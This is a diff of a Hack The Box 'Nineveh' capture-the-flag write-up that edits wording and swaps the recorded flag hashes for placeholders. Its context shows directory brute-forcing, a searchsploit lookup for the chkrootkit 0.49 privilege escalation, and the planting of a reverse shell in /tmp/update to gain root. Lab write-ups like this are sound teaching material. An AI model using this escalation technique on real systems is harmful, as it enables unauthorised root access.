@@ -99,7 +99,7 @@ An image, but nothing else interesting, check out the SSL certificate to see wha
 
 ![website_certificate](/assets/images/2020-06-24-21-52-24.png)
 
-We have an email and domain, make note for later. Not a lot here so try gobuster:
+We have an email address and domain, make note for later. Not a lot here so try gobuster:
 
 ```text
 root@kali:~/htb/nineveh# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.43
@@ -323,8 +323,8 @@ We can see the user flag but haven't got the rights to read it yet:
 
 ```text
 www-data@nineveh:/var/www/html/department$ ls -l /home/amrois/
-
 -rw------- 1 amrois amrois 33 Jul  2  2017 user.txt
+
 www-data@nineveh:/var/www/html/department$ cat /home/amrois/user.txt
 cat: /home/amrois/user.txt: Permission denied
 ```
@@ -333,7 +333,6 @@ After having a look around I find a non-standard folder /report with txt files i
 
 ```text
 www-data@nineveh:/var/www/html/department$ ls -l /report/
-
 -rw-r--r-- 1 amrois amrois 4807 Jun 22 17:00 report-20-06-22:17:00.txt
 -rw-r--r-- 1 amrois amrois 4807 Jun 22 17:01 report-20-06-22:17:01.txt
 -rw-r--r-- 1 amrois amrois 4807 Jun 22 17:02 report-20-06-22:17:02.txt
@@ -343,7 +342,6 @@ Looks to be a cronjob or similar that is creating them every minute, have a look
 
 ```text
 www-data@nineveh:/var/www/html/department$ cat /report/report-20-06-22\:17\:09.txt
-
 ROOTDIR is `/'
 Checking `amd'... not found
 Checking `basename'... not infected
@@ -401,7 +399,7 @@ Chkrootkit 0.49 - Local Privilege Escalation                                    
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 ```
 
-Looks interesting, have a look:
+Looks interesting, let's see the detail:
 
 ```text
 root@kali:~/htb/nineveh# searchsploit -x linux/local/33899.txt
@@ -422,7 +420,7 @@ Result: The file /tmp/update will be executed as root, thus effectively
 rooting your box, if malicious content is placed inside the file.
 ```
 
-Looks promising, create the update file in tmp with using the same reverse shell command as before:
+Looks promising, create the update file in tmp using the same reverse shell command as before:
 
 ```text
 www-data@nineveh:/tmp$ cat update
@@ -447,10 +445,10 @@ Get the flags:
 
 ```text
 # cat /home/amrois/user.txt
-82a864f9eec2a76c166ec7b1078ca6c8
+<<HIDDEN>>
 
 # cat /root/root.txt
-8a2b4956612b485720694fb45849ec3a
+<<HIDDEN>>
 ```
 
 ## Alternate Method: Port Knocking
